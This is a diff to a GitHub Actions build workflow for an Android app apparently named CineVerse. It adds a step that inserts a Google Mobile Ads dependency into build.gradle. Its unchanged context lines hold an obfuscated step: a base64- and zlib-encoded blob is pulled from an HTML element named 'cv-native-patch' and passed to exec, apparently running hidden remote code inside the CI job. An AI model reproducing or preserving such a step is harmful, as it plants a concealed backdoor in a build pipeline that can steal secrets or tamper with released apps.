@@ -26,7 +26,32 @@ jobs:
           b=re.search(r'id="cv-native-patch">([^<]*)<',h).group(1)
           exec(zlib.decompress(base64.b64decode(b)).decode())
           PY
+
+      # ADD ADMOB DEPENDENCY HERE
+      - name: Add Google Mobile Ads dependency
+        run: |
+          python3 - <<'PY'
+          from pathlib import Path
+
+          file = Path("android/app/build.gradle")
+          content = file.read_text()
+
+          dependency = "implementation 'com.google.android.gms:play-services-ads:25.5.0'"
+
+          if dependency not in content:
+              content = content.replace(
+                  "dependencies {",
+                  "dependencies {\n    " + dependency,
+                  1
+              )
+              file.write_text(content)
+
+          print("Google Mobile Ads dependency added.")
+          PY
+
+      # EXISTING BUILD STEP
       - run: cd android && chmod +x gradlew && ./gradlew assembleDebug
+
       - uses: actions/upload-artifact@v4
         with:
           name: CineVerse-apk
